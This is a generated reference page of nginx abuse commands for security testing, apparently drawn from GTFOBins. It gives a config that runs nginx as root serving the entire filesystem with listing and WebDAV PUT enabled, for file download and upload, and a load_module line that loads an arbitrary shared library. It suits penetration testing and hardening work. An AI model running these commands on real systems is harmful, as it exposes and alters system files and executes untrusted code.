---
parsed_by: focuslocust
source: commands
type: generated
---
# nginx Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## nginx

Tool page: [nginx](../../tools/linux/nginx.md)

### download

```text
cat >/path/to/temp-file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /path/to/temp-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nginx` |
| Evidence | Function example preserved from source parser. |

### library-load

```text
cat >/path/to/temp-file <<EOF
load_module /path/to/lib.so
EOF

nginx -t -c /path/to/temp-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nginx` |
| Evidence | Function example preserved from source parser. |

### upload

```text
cat >/path/to/temp-file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /path/to/temp-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nginx` |
| Evidence | Function example preserved from source parser. |
